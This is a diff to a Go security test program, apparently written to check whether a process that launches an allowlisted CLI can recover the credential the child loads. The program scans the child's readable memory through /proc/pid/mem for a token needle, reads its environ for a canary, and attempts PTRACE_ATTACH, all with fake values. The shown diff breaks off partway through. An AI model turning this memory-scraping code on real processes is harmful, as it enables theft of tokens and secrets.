@@ -1,11 +1,14 @@
-// Command ancestorptrace spawns a child and, as its ancestor, tries
-// PTRACE_ATTACH, /proc/<pid>/mem, /proc/<pid>/environ, and process_vm_readv.
-// Yama ptrace_scope=1 permits ancestors; this shows whether an attacker that
-// launches an allowlisted CLI can read its memory.
+// Command ancestorptrace launches a child (argv[1:], e.g. an allowlisted
+// credchild reading a FUSE-served credential) and, as its ancestor under Yama
+// ptrace_scope=1, tries to recover the credential from the child's address
+// space: it scans readable memory regions for NEEDLE, reads /proc/<pid>/environ,
+// and does PTRACE_ATTACH/GETREGS. This shows whether an attacker that launches
+// an allowlisted CLI can read the plaintext it loaded.
 package main
 
 import (
 	"bufio"
+	"bytes"
 	"fmt"
 	"os"
 	"os/exec"
@@ -13,51 +16,75 @@ import (
 	"strings"
 	"syscall"
 	"time"
-	"unsafe"
 )
 
-func firstMap(pid int) uintptr {
-	f, err := os.Open(fmt.Sprintf("/proc/%d/maps", pid))
+func needle() []byte {
+	n := os.Getenv("NEEDLE")
+	if n == "" {
+		n = "gho_FAKE"
+	}
+	return []byte(n)
+}
+
+// scanMem reads each readable region from /proc/pid/maps via /proc/pid/mem and
+// reports whether the needle appears in the child's memory.
+func scanMem(pid int, want []byte) bool {
+	maps, err := os.Open(fmt.Sprintf("/proc/%d/maps", pid))
 	if err != nil {
 		fmt.Println("open maps:", err)
-		return 0
+		return false
 	}
-	defer f.Close()
-	sc := bufio.NewScanner(f)
+	defer maps.Close()
+	mem, err := os.Open(fmt.Sprintf("/proc/%d/mem", pid))
+	if err != nil {
+		fmt.Println("open mem:", err)
+		return false
+	}
+	defer mem.Close()
+	sc := bufio.NewScanner(maps)
 	for sc.Scan() {
-		l := sc.Text()
-		if strings.Contains(l, " r") {
-			a, _ := strconv.ParseUint(strings.Split(strings.Fields(l)[0], "-")[0], 16, 64)
-			return uintptr(a)
+		fields := strings.Fields(sc.Text())
+		if len(fields) < 2 || !strings.HasPrefix(fields[1], "r") {
+			continue
+		}
+		bounds := strings.Split(fields[0], "-")
+		lo, _ := strconv.ParseUint(bounds[0], 16, 64)
+		hi, _ := strconv.ParseUint(bounds[1], 16, 64)
+		size := hi - lo
+		if size == 0 || size > 8<<20 { // skip huge regions
+			continue
+		}
+		buf := make([]byte, size)
+		if _, err := mem.ReadAt(buf, int64(lo)); err != nil && err.Error() != "EOF" {
+			continue
+		}
+		if bytes.Contains(buf, want) {
+			return true
 		}
 	}
-	return 0
+	return false
 }
 
 func main() {
-	cmd := exec.Command("sh", "-c", "SECRET_IN_ENV=canary-value-1234 exec sleep 30")
+	args := os.Args[1:]
+	if len(args) == 0 {
+		args = []string{"sh", "-c", "SECRET_IN_ENV=canary-1234 exec sleep 30"}
+	}
+	cmd := exec.Command(args[0], args[1:]...)
+	cmd.Stdout, cmd.Stderr = os.Stdout, os.Stderr
 	if err := cmd.Start(); err != nil {
 		panic(err)
 	}
 	pid := cmd.Process.Pid
-	time.Sleep(200 * time.Millisecond)
-	env, err := os.ReadFile(fmt.Sprintf("/proc/%d/environ", pid))
-	fmt.Println("read child environ:", err, "contains canary:", strings.Contains(string(env), "canary-value-1234"))
-	addr := firstMap(pid)
-	buf := make([]byte, 16)
-	if f, err := os.Open(fmt.Sprintf("/proc/%d/mem", pid)); err == nil {
-		_, rerr := f.ReadAt(buf, int64(addr))
-		fmt.Println("read child /proc/pid/mem:", rerr)
-		f.Close()
-	} else {
-		fmt.Println("open child /proc/pid/mem:", err)
-	}
-	local := syscall.Iovec{Base: &buf[0], Len: 16}
-	remote := syscall.Iovec{Base: (*byte)(unsafe.Pointer(addr)), Len: 16}
-	const sysProcessVMReadv = 310 // linux/amd64
-	n, _, errno := syscall.Syscall6(sysProcessVMReadv, uintptr(pid), uintptr(unsafe.Pointer(&local)), 1, uintptr(unsafe.Pointer(&remote)), 1, 0)
-	fmt.Println("process_vm_readv on child: n =", int(n), "errno =", errno)
-	err = syscall.PtraceAttach(pid)
+	time.Sleep(500 * time.Millisecond) // let the child load the credential
+
+	env, _ := os.ReadFile(fmt.Sprintf("/proc/%d/environ", pid))
+	fmt.Println("child environ contains canary-1234:", bytes.Contains(env, []byte("canary-1234")))
+
+	found := scanMem(pid, needle())
+	fmt.Printf("recovered credential from child memory (needle=%q): %v\n", string(needle()), found)
+
+	err := syscall.PtraceAttach(pid)
 	fmt.Println("PTRACE_ATTACH child:", err)
 	if err == nil {
 		var ws syscall.WaitStatus
